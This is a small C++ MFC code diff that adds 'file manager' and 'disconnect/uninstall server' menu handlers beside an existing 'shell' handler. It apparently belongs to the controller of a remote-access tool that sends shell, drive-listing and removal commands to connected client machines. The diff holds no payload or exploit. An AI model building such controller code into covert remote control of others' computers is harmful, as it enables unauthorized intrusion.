@@ -65,6 +65,8 @@ BEGIN_MESSAGE_MAP(CChildView, CWnd)
 
 	
 	ON_COMMAND(ID_LISTCTRLMENU_SHELL, &CChildView::OnListctrlmenuShell)
+	ON_COMMAND(ID_LISTCTRLMENU_FILEMANAGER, &CChildView::OnListctrlmenuFilemanager)
+	ON_COMMAND(ID_LISTCTRLMENU_DISCONNECT, &CChildView::OnListctrlmenuDisconnect)
 END_MESSAGE_MAP()
 
 
@@ -334,5 +336,23 @@ void CChildView::OnListctrlmenuShell()
 {
 	// TODO: 在此添加命令处理程序代码
 	BYTE	bToken = COMMAND_SHELL;
+	SendSelectCommand(&bToken, sizeof(BYTE));	
+}
+
+
+void CChildView::OnListctrlmenuFilemanager()
+{
+	// TODO: 在此添加命令处理程序代码
+	BYTE	bToken = COMMAND_LIST_DRIVE;
+	SendSelectCommand(&bToken, sizeof(BYTE));
+}
+
+
+void CChildView::OnListctrlmenuDisconnect()
+{
+	// TODO: 在此添加命令处理程序代码
+	if (MessageBox("确认卸载服务端吗 -:)", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
+		return;
+	BYTE	bToken = COMMAND_REMOVE;
 	SendSelectCommand(&bToken, sizeof(BYTE));	
 }
